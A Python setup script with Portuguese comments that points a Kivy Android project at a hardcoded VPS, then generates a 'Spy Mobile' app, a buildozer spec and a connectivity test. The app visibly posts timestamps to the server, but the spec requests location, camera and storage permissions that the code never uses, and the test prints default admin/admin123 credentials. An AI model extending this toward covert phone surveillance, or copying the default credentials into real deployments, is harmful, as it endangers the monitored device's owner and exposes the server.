#!/usr/bin/env python3
"""
Script para atualizar o app.py e main.py para usar o IP da VPS
"""

import os
import re

# IP da VPS
VPS_IP = '147.79.111.118'
VPS_PORT = '80'  # Nginx redireciona para 8000

def atualizar_arquivo(caminho_arquivo, ip_antigo_pattern, novo_ip):
    """Atualiza IP em um arquivo"""
    if not os.path.exists(caminho_arquivo):
        print(f"❌ Arquivo não encontrado: {caminho_arquivo}")
        return False
    
    try:
        with open(caminho_arquivo, 'r', encoding='utf-8') as f:
            conteudo = f.read()
        
        # Padrões para substituir
        padroes = [
            (r"SERVER_IP\s*=\s*['\"]127\.0\.0\.1['\"]", f"SERVER_IP = '{novo_ip}'"),
            (r"SERVER_IP\s*=\s*['\"]localhost['\"]", f"SERVER_IP = '{novo_ip}'"),
            (r"SERVER_IP\s*=\s*['\"]192\.168\.\d+\.\d+['\"]", f"SERVER_IP = '{novo_ip}'"),
            (r"http://127\.0\.0\.1:8000", f"http://{novo_ip}"),
            (r"http://localhost:8000", f"http://{novo_ip}"),
            (r"http://192\.168\.\d+\.\d+:8000", f"http://{novo_ip}"),
            (r"'http://192\.168\.0\.97:8000/api/data/'", f"'http://{novo_ip}/api/atividade/'"),
        ]
        
        conteudo_original = conteudo
        for padrao, substituicao in padroes:
            conteudo = re.sub(padrao, substituicao, conteudo)
        
        if conteudo != conteudo_original:
            with open(caminho_arquivo, 'w', encoding='utf-8') as f:
                f.write(conteudo)
            print(f"✅ Atualizado: {caminho_arquivo}")
            return True
        else:
            print(f"ℹ️  Nenhuma alteração necessária: {caminho_arquivo}")
            return True
            
    except Exception as e:
        print(f"❌ Erro atualizando {caminho_arquivo}: {e}")
        return False

def criar_main_py_vps():
    """Cria main.py otimizado para VPS"""
    conteudo = f'''from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.clock import Clock
from kivy.core.window import Window
import time
import requests
import threading
from datetime import datetime

class SpyApp(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(orientation='vertical', **kwargs)
        self.is_monitoring = False
        self.start_time = None
        self.timer_event = None
        
        layout = BoxLayout(orientation='vertical', padding=20, spacing=20)
        
        # Título
        layout.add_widget(Label(
            text='SPY MOBILE VPS', 
            font_size=30, 
            color=(1,0,0,1), 
            bold=True
        ))
        
        # Timer
        self.timer_label = Label(
            text='00:00:00', 
            font_size=60, 
            color=(0.5,0.5,0.5,1),
            bold=True
        )
        layout.add_widget(self.timer_label)
        
        # Status
        self.status_label = Label(
            text='Sistema Parado', 
            font_size=18,
            color=(0.7,0,0,1)
        )
        layout.add_widget(self.status_label)
        
        # Botões
        buttons = BoxLayout(orientation='horizontal', size_hint_y=0.3, spacing=10)
        
        self.play_btn = Button(
            text='PLAY', 
            font_size=20, 
            background_color=(0,0.8,0,1),
            bold=True
        )
        self.play_btn.bind(on_press=self.start)
        buttons.add_widget(self.play_btn)
        
        self.stop_btn = Button(
            text='STOP', 
            font_size=20, 
            background_color=(0.8,0,0,1),
            bold=True,
            disabled=True
        )
        self.stop_btn.bind(on_press=self.stop)
        buttons.add_widget(self.stop_btn)
        
        layout.add_widget(buttons)
        
        # Info VPS
        layout.add_widget(Label(
            text='Conectado à VPS: {VPS_IP}', 
            font_size=14,
            color=(0.5,0.5,0.5,1)
        ))
        
        self.add_widget(layout)

    def start(self, btn):
        if not self.is_monitoring:
            self.is_monitoring = True
            self.start_time = time.time()
            self.status_label.text = 'Conectando à VPS...'
            self.timer_label.color = (1,0,0,1)
            self.play_btn.disabled = True
            self.stop_btn.disabled = False
            self.timer_event = Clock.schedule_interval(self.update_timer, 1)
            
            # Iniciar monitoramento em thread separada
            threading.Thread(target=self.monitoring_loop, daemon=True).start()

    def stop(self, btn):
        if self.is_monitoring:
            self.is_monitoring = False
            if self.timer_event:
                self.timer_event.cancel()
            self.status_label.text = 'Sistema Parado'
            self.timer_label.color = (0.5,0.5,0.5,1)
            self.timer_label.text = '00:00:00'
            self.play_btn.disabled = False
            self.stop_btn.disabled = True

    def update_timer(self, dt):
        if self.is_monitoring and self.start_time:
            elapsed = int(time.time() - self.start_time)
            h, m, s = elapsed//3600, (elapsed%3600)//60, elapsed%60
            self.timer_label.text = f'{{h:02d}}:{{m:02d}}:{{s:02d}}'

    def monitoring_loop(self):
        """Loop de monitoramento"""
        while self.is_monitoring:
            try:
                self.collect_and_send_data()
                time.sleep(30)  # Enviar a cada 30 segundos
            except Exception as e:
                print(f"Erro no loop: {{e}}")
                time.sleep(10)

    def collect_and_send_data(self):
        """Coleta e envia dados para VPS"""
        try:
            # Dados do dispositivo
            data = {{
                'imei': 'spy_mobile_{{int(time.time())}}',
                'descricao': f'Monitoramento ativo - {{datetime.now().strftime("%H:%M:%S")}}',
                'timestamp': datetime.now().isoformat()
            }}
            
            # Enviar para VPS
            response = requests.post(
                'http://{VPS_IP}/api/atividade/', 
                json=data, 
                timeout=10
            )
            
            if response.status_code in [200, 201]:
                self.status_label.text = 'Dados Enviados para VPS!'
            else:
                self.status_label.text = f'Erro VPS: {{response.status_code}}'
                
        except requests.exceptions.ConnectionError:
            self.status_label.text = 'VPS Offline - Tentando...'
        except Exception as e:
            self.status_label.text = f'Erro: {{str(e)[:30]}}'

class SpyMobileApp(App):
    def build(self):
        Window.clearcolor = (0, 0, 0, 1)
        return SpyApp()

if __name__ == '__main__':
    SpyMobileApp().run()
'''
    
    with open('main_vps.py', 'w', encoding='utf-8') as f:
        f.write(conteudo)
    
    print("✅ Criado: main_vps.py")

def criar_buildozer_vps():
    """Cria buildozer.spec para VPS"""
    conteudo = f'''[app]
title = Spy Mobile VPS
package.name = spymobilevps
package.domain = org.spy.vps
source.dir = .
version = 1.0
requirements = python3,kivy,requests
orientation = portrait
android.api = 30
android.minapi = 21
android.archs = arm64-v8a
android.release_artifact = apk

[buildozer]
log_level = 2
warn_on_root = 0

[app:android.permissions]
INTERNET = 1
ACCESS_NETWORK_STATE = 1
ACCESS_FINE_LOCATION = 1
READ_EXTERNAL_STORAGE = 1
CAMERA = 1
'''
    
    with open('buildozer_vps.spec', 'w', encoding='utf-8') as f:
        f.write(conteudo)
    
    print("✅ Criado: buildozer_vps.spec")

def criar_teste_vps():
    """Cria script de teste para VPS"""
    conteudo = f'''#!/usr/bin/env python3
"""
Teste de conectividade com a VPS
"""

import requests
import json
from datetime import datetime

VPS_URL = 'http://{VPS_IP}'

def testar_vps():
    print("🧪 TESTANDO CONECTIVIDADE COM VPS")
    print("=" * 40)
    print(f"🌐 VPS: {{VPS_URL}}")
    
    # Teste 1: API Test
    try:
        response = requests.get(f'{{VPS_URL}}/api/test/', timeout=10)
        if response.status_code == 200:
            print("✅ VPS online e funcionando")
        else:
            print(f"⚠️ VPS respondeu com status: {{response.status_code}}")
    except Exception as e:
        print(f"❌ VPS offline ou inacessível: {{e}}")
        return False
    
    # Teste 2: Enviar atividade
    try:
        data = {{
            'imei': 'teste_vps_123',
            'descricao': f'Teste de conectividade - {{datetime.now()}}',
            'timestamp': datetime.now().isoformat()
        }}
        
        response = requests.post(f'{{VPS_URL}}/api/atividade/', json=data, timeout=10)
        if response.status_code in [200, 201]:
            print("✅ Dados enviados com sucesso")
        else:
            print(f"⚠️ Erro enviando dados: {{response.status_code}}")
    except Exception as e:
        print(f"❌ Erro enviando dados: {{e}}")
    
    print(f"\\n🌐 Acesse: {{VPS_URL}}")
    print("🔑 Login: admin / admin123")
    
    return True

if __name__ == "__main__":
    testar_vps()
'''
    
    with open('testar_vps.py', 'w', encoding='utf-8') as f:
        f.write(conteudo)
    
    print("✅ Criado: testar_vps.py")

def main():
    """Função principal"""
    print("🔄 ATUALIZANDO ARQUIVOS PARA VPS")
    print("=" * 40)
    print(f"🌐 IP da VPS: {VPS_IP}")
    
    # Arquivos para atualizar
    arquivos = [
        'Spy-mobile/calcme/app.py',
        'Spy-mobile/main.py',
        'main.py',
        'setup_apk_windows.ps1'
    ]
    
    # Atualizar arquivos existentes
    for arquivo in arquivos:
        if os.path.exists(arquivo):
            atualizar_arquivo(arquivo, r'127\.0\.0\.1', VPS_IP)
    
    # Criar novos arquivos otimizados para VPS
    criar_main_py_vps()
    criar_buildozer_vps()
    criar_teste_vps()
    
    print("\n✅ ATUALIZAÇÃO CONCLUÍDA!")
    print("\n📋 PRÓXIMOS PASSOS:")
    print("1. Execute: conectar_e_configurar_vps.bat")
    print("2. Aguarde instalação na VPS (5-10 min)")
    print("3. Teste: python testar_vps.py")
    print("4. Gere APK com: buildozer android debug -f buildozer_vps.spec")
    print(f"5. App enviará dados para: http://{VPS_IP}")

if __name__ == "__main__":
    main()